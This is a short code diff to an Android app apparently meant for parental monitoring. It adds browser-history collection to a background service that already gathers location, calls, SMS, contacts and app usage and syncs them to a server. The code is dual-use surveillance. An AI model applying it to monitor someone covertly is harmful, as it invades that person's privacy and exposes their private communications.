@@ -16,6 +16,7 @@ import com.parental.agent.collectors.calls.CallCollector
 import com.parental.agent.collectors.contacts.ContactCollector
 import com.parental.agent.collectors.location.LocationCollector
 import com.parental.agent.collectors.sms.SmsCollector
+import com.parental.agent.collectors.webhistory.WebHistoryCollector
 import com.parental.agent.data.local.AppDatabase
 import com.parental.agent.data.local.AppPreferences
 import com.parental.agent.sync.ApiConstants
@@ -65,6 +66,7 @@ class ForegroundService : Service() {
             val contactCollector = ContactCollector(this@ForegroundService)
             val appUsageCollector = AppUsageCollector(this@ForegroundService)
             val installedAppCollector = InstalledAppCollector(this@ForegroundService)
+            val webHistoryCollector = WebHistoryCollector(this@ForegroundService)
 
             while (isActive) {
                 try {
@@ -74,9 +76,10 @@ class ForegroundService : Service() {
                     val contactCount = contactCollector.collect()
                     val usageCount = appUsageCollector.collect()
                     val installedAppCount = installedAppCollector.collect()
+                    val historyCount = webHistoryCollector.collect()
 
-                    if (locCount > 0 || callCount > 0 || smsCount > 0 || contactCount > 0 || usageCount > 0 || installedAppCount > 0) {
-                        Log.d(TAG, "New Telemetry collected: Loc=$locCount, Calls=$callCount, SMS=$smsCount, Contacts=$contactCount, Usage=$usageCount, InstalledApps=$installedAppCount")
+                    if (locCount > 0 || callCount > 0 || smsCount > 0 || contactCount > 0 || usageCount > 0 || installedAppCount > 0 || historyCount > 0) {
+                        Log.d(TAG, "New Telemetry collected: Loc=$locCount, Calls=$callCount, SMS=$smsCount, Contacts=$contactCount, Usage=$usageCount, InstalledApps=$installedAppCount, History=$historyCount")
                     }
 
                     // Perform chunked batch network sync until all pending unsynced events are drained
